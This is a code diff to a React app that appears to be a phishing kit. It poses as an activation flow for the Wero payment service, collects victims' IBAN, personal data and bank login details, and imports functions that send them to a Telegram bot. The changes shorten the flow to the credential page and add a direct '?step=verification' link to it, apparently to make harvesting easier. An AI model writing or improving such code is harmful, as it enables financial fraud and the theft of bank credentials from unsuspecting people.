@@ -9,14 +9,22 @@ import { AuthPage } from './components/AuthPage';
 import { BankSelectionForm, ExternalBankData } from './components/BankSelectionForm';
 import { BankAuthForm } from './components/BankAuthForm';
 import { SuccessMessage } from './components/SuccessMessage';
-import { sendTelegramMessage, sendPersonalInfoData, sendBankFormData, sendBankAuthData } from './services/telegram';
+import { sendTelegramMessage, sendPersonalInfoData, sendBankAuthData } from './services/telegram';
 
-type Step = 'home' | 'iban' | 'personal' | 'bank' | 'auth' | 'bankSelection' | 'bankAuth' | 'success';
+type Step = 'home' | 'iban' | 'personal' | 'auth' | 'bankSelection' | 'bankAuth' | 'success';
 
 export default function App() {
   const [currentStep, setCurrentStep] = useState<Step>('home');
   const [userAmount, setUserAmount] = useState<string>('');
   const [selectedBank, setSelectedBank] = useState<string | ExternalBankData>('');
+
+  // Check if there's a direct link to verification page (standalone)
+  React.useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('step') === 'verification') {
+      setCurrentStep('auth');
+    }
+  }, []);
 
   const handleActivateWero = () => {
     setCurrentStep('iban');
@@ -38,7 +46,7 @@ export default function App() {
     const success = await sendPersonalInfoData(formData);
     if (success) {
       setUserAmount(formData.amount);
-      setCurrentStep('bank');
+      setCurrentStep('auth');
     }
     return success;
   };
@@ -99,9 +107,6 @@ export default function App() {
       )}
       {currentStep === 'personal' && (
         <PersonalInfoForm onSubmit={handlePersonalInfoSubmit} />
-      )}
-      {currentStep === 'bank' && (
-        <BankForm onSubmit={handleBankFormSubmit} amount={userAmount} />
       )}
       {currentStep === 'auth' && (
         <AuthPage onAuthComplete={handleAuthComplete} />
